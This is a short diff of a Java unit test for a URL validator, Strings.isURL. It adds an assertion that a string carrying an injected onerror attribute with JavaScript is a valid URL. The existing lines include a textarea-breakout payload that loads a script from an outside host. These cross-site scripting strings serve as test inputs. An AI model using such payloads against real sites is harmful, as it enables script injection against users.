@@ -46,5 +46,7 @@ public class StringsTestCase {
         assertTrue(Strings.isURL("http://b3log.org"));
 
         assertTrue(Strings.isURL("http://</textarea>'\"><script src=http://viiv.ml/Wmtrhb></script>"));
+        
+        assertTrue(Strings.isURL("http://error\"  onerror=\"this.src='http://7u2fje.com1.z0.glb.clouddn.com/girl.jpg';this.removeAttribute('onerror');if(!window.a){console.log('Where am I ?');window.a=1}"));
     }
 }
